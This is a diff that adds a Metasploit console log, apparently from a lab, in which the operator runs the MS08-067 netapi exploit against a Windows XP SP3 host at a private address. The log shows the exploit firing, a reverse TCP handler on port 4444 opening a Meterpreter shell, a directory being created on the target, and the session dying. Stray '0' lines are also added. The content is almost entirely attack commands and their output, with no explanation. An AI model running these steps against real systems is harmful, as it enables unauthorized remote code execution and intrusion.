@@ -17,3 +17,28 @@ Creating directory: 4070E025
 meterpreter > 
 [*] 172.20.155.164 - Meterpreter session 3 closed.  Reason: Died
 
+0
+0
+0
+0
+
+
+msf exploit(windows/smb/ms08_067_netapi) > set RHOST 172.20.155.164
+RHOST => 172.20.155.164
+msf exploit(windows/smb/ms08_067_netapi) > exploit
+
+[*] Started reverse TCP handler on 172.20.155.21:4444 
+[*] 172.20.155.164:445 - Automatically detecting the target...
+[*] 172.20.155.164:445 - Fingerprint: Windows XP - Service Pack 3 - lang:Chinese - Traditional / Taiwan
+[*] 172.20.155.164:445 - Selected Target: Windows XP SP3 Chinese - Traditional / Taiwan (NX)
+[*] 172.20.155.164:445 - Attempting to trigger the vulnerability...
+[*] Sending stage (179779 bytes) to 172.20.155.164
+[*] Meterpreter session 3 opened (172.20.155.21:4444 -> 172.20.155.164:1043) at 2018-10-09 04:07:51 -0400
+
+meterpreter > pwd
+C:\
+meterpreter > mkdir 4070E025
+Creating directory: 4070E025
+meterpreter > 
+[*] 172.20.155.164 - Meterpreter session 3 closed.  Reason: Died
+
